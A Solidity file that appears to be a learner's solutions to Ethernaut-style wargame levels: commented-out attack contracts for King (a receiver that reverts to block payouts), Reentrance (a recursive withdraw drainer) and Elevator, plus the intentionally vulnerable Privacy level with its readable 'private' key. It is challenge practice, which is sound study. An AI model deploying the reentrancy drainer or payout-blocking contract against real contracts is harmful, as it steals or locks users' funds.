// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

// contract Vault {
//   bool public locked;
//   bytes32 private password;

//   constructor(bytes32 _password) public {
//     locked = true;
//     password = _password;
//   }

//   function unlock(bytes32 _password) public {
//     if (password == _password) {
//       locked = false;
//     }
//   }
// }



// contract badKing{

//     address king = payable(0x5d21BC3ee7eF89a6c881a0124b20643404B0Aa7f);

//     function becomeKing() public payable {
//        (bool sent, ) = king.call{value: msg.value}("");
//         require(sent, "Failed to send value!");
//     }

//     function receiveETH() public payable{

//     }

//     receive() external payable {
//         revert("Haha... You lose");
//     }
// }

// interface IReentrance{
//   function donate(address _to) external payable;
//   function withdraw(uint _amount) external;
// }

// contract ReentrantAttack{
//   IReentrance vulnerableContract;

//   constructor(address _vulnerableContract){
//     vulnerableContract = IReentrance(_vulnerableContract);
//   }

//   function drainContract(address _who) public payable{
//     require(msg.value >= 1000000000000000);
//     vulnerableContract.donate{value: msg.value}(_who);
//     vulnerableContract.withdraw(msg.value);
//   }


//   receive() external payable{
//     uint vulnerableBalance = address(vulnerableContract).balance;
//     require(vulnerableBalance >= 1000000000000000, "Contraact empty");
//     vulnerableContract.withdraw(1000000000000000);
//   }
// }


// interface Building {
//   function isLastFloor(uint) external returns (bool);
// }

// interface IElevator {
//     function goTo(uint _floor) external;
// }

// contract MyBuilding is Building {
//     bool public last = true;

//     function isLastFloor(uint _n) override external returns (bool) {
//         last = !last;
//         return last;
//     }

//     function goToTop(address _elevatorAddr) public {
//         IElevator(_elevatorAddr).goTo(1);
//     }
// }

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}